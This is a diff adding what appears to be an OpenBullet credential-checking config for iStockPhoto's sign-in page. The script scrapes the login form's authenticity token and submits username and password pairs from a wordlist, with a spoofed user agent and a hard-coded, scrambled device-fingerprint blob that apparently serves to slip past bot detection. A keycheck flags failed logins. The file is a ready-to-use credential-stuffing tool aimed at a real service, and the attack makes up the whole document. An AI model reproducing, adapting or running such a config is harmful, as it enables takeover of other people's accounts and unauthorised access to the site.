@@ -1,0 +1,47 @@
+[SETTINGS]
+{
+  "Name": "IStockPhoto",
+  "SuggestedBots": 1,
+  "LastModified": "2018-10-19T00:52:55.9680593+00:00",
+  "AdditionalInfo": "",
+  "Author": "TomKirkman",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://www.istockphoto.com/sign-in?returnurl=%2F" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.istockphoto.com/sign-in?returnurl=%2F" 
+  HEADER "Origin: https://www.istockphoto.com" 
+  HEADER "Content-Length: 3042" 
+PARSE "<SOURCE>" LR "name=\"authenticity_token\" value=\"" "\" />" Recursive=FALSE -> VAR "TOKEN" "" "" 
+REQUEST POST "https://www.istockphoto.com/sign-in?returnurl=%2F" AutoRedirect=TRUE 
+  CONTENT "utf8=%E2%9C%93&authenticity_token=<TOKEN>&new_session%5Breturn_url%5D=%2F&new_session%5Busername%5D=<USER>&new_session%5Bpassword%5D=<PASS>&elqCustomerGUID=7f45a8f6-58d5-4f52-8a35-cc701ca4bcb6&button=&nds-pmd=%7B%22jvqtrgQngn%22%3A%7B%22oq%22%3A%22691%3A589%3A1280%3A680%3A1280%3A680%22%2C%22wfi%22%3A%22flap-99142%22%2C%22oc%22%3A%22qr5po8oq633q65p0%22%2C%22fe%22%3A%221280k720+24%22%2C%22qvqgm%22%3A%22300%22%2C%22jxe%22%3A1995%2C%22syi%22%3A%22snyfr%22%2C%22si%22%3A%22si%2Cbtt%2Czc4%2Cjroz%22%2C%22sn%22%3A%22sn%2Czcrt%2Cbtt%2Cjni%22%2C%22us%22%3A%226n6863847519no58%22%2C%22cy%22%3A%22Jva32%22%2C%22sg%22%3A%22%7B%5C%22zgc%5C%22%3A0%2C%5C%22gf%5C%22%3Asnyfr%2C%5C%22gr%5C%22%3Asnyfr%7D%22%2C%22sp%22%3A%22%7B%5C%22gp%5C%22%3Agehr%2C%5C%22ap%5C%22%3Agehr%7D%22%2C%22sf%22%3A%22gehr%22%2C%22jt%22%3A%22ss4n2rp5r9p7o3s0%22%2C%22sz%22%3A%221rqsq5761s4859n9%22%2C%22vce%22%3A%22apvc%2C0%2C5op926o6%2C2%2C1%3Bfg%2C0%2Carj_frffvba_hfreanzr%2C0%2Carj_frffvba_cnffjbeq%2C0%3Bss%2C1%2Carj_frffvba_hfreanzr%3Bso%2C906%2Carj_frffvba_hfreanzr%3Bzz%2C5pnr%2C2ns%2Cqn%2C%3Bgf%2C0%2C65o5%3Bzzf%2C3r9%2C0%2Cn%2C271+2o6%2C41qs+3o17%2C1n39%2C1n50%2C-205op%2Coqr2%2C-625p%3Bzzf%2C3r8%2C3r8%2Cn%2CABC%3Bzzf%2C3r9%2C3r9%2Cn%2C182p+1243%2C5748+45sq%2Cr38%2Cr3s%2C-327o4%2C45rp0%2C80%3Bzzf%2C3r8%2C3r8%2Cn%2Co908+124%2Co908+124%2C1281%2C1194%2C-72808%2C79ooq%2Co92%3Bxx%2Cnss%2C0%2Carj_frffvba_hfreanzr%3Bss%2C3%2Carj_frffvba_hfreanzr%3Bzzf%2Co5%2Coo7%2Cn%2CABC%3Bxq%2C14%3Bzz%2C2%2C115%2C2%2C%3Bso%2C1s%2Carj_frffvba_hfreanzr%3Bzzf%2C3o2%2C3r7%2Cn%2C10510+295q%2C10510+295q%2C1n6s%2C1no2%2C-n6qqq%2Cn38sr%2C-549%3Bzzf%2C3rn%2C3rn%2Cn%2CABC%3Bzzf%2C3r7%2C3r7%2Cn%2CABC%3Bzzf%2C3r8%2C3r8%2Cn%2CABC%3Bzzf%2C3r9%2C3r8%2Cn%2CABC%3Bzzf%2C2715%2C2716%2C32%2CABC%3Bgf%2C0%2Coonp%3Bzzf%2C270s%2C270s%2C32%2CABC%3Bxx%2C1325%2C0%2Carj_frffvba_hfreanzr%3Bss%2C5%2Carj_frffvba_hfreanzr%3Bzz%2C8s%2C2rp%2C0%2C%3Bgf%2C0%2Cs674%3Bso%2C500%2Carj_frffvba_hfreanzr%3Bxx%2C772%2C0%2Carj_frffvba_hfreanzr%3Bss%2C0%2Carj_frffvba_hfreanzr%3Bxq%2C29o%3Bxq%2Co5%3Bxq%2C60%3Bxq%2C115%3Bxq%2Cs0%3Bxq%2C65%3Bxq%2Cnq%3Bzzf%2C1r%2C2710%2C32%2C0+2on%2C2120+589o%2C63o%2C3r37%2C-19564%2C1qo58%2C14%3Bxq%2C54%3Bxq%2Cr6%3Bso%2C1%2Carj_frffvba_hfreanzr%3Bxx%2C6%2C0%2Carj_frffvba_cnffjbeq%3Bss%2C0%2Carj_frffvba_cnffjbeq%3Bxq%2C1%3Bxq%2C19p%3Bxq%2C84%3Bxq%2Cpo%3Bxq%2C3n%3Bxq%2Cn1%3Bxq%2C5n%3Bxq%2C6s%3Bxq%2C8n%3Bxq%2C4n%3Bxq%2Cq6%3Bxq%2C7n%3Bxq%2C40%3Bxq%2C7s" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.istockphoto.com/sign-in?returnurl=%2F" 
+  HEADER "Origin: https://www.istockphoto.com" 
+  HEADER "Content-Length: 3042" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Double-check and try again" 
